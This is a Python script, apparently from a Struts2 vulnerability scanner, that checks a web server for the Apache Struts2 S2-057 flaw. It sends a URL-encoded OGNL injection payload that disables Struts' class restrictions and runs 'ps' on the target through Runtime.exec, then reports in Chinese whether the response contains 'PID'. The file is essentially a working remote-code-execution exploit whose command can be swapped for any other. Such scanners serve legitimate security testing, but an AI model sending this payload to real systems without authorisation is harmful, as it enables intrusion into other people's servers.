# -*- encoding: utf-8 -*-
'''
@File : s2_057.py
@Time : 2019/08/03 22:03:03
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''


import requests
from urllib.parse import urlparse
import argparse
import sys
from lib import *

def s2_057(url):
    try:
        url1 = urlparse(url)
        domainorip = url1.netloc
        url = domainorip.split(':')[0]
        potorl = url1.scheme      #        params=url1.params
        path = url1.path          #        query=url1.query
        port = url1.port          #        fragment=url1.fragment
        newurl = potorl + '://' + url +':'+ str(port)+'/'
        payload = "%24%7B%0A%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ps%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action"
        url= newurl+payload+path
        res = requests.get(url, allow_redirects=False)
        if 'PID' in res.text :
            print(Vcolors.RED +"存在S2-057漏洞~"+ Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +"不存在S2-057漏洞~"+ Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN +"不存在S2-057漏洞~"+ Vcolors.ENDC)